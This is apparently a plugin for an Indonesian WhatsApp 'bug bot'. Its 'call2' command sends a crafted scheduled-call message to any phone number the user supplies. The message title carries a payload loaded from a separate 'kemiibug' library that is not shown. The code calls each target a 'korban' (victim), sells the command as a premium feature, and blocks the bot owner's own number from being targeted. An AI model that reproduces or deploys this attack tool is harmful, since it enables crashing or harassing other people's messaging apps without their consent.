let moment = require('moment-timezone')
let time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { kemiibug } = require('../lib/kemiibug.js')

let handler = async (m, { conn, text, command, usedPrefix }) => {
if (!text) return conn.reply(m.chat, '• *Example :* .call 6288980870067', m)
if (text == nomorown) return conn.reply(m.chat, 'Tidak bisa Telepon ke nomor ini!', m)
let call = { 
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: `${kemiibug}`
}}
conn.relayMessage(`${text}@s.whatsapp.net`, call, {})
let logs = `[ ✔️ ] Berhasil Call Korban wa.me/${text}`
conn.reply(m.chat, logs, m)
}
handler.help = ['call2 *<number>*']
handler.tags = ['premium']
handler.premium = true
handler.command = /^(call2)$/i
handler.register = true
handler.limit = true

module.exports = handler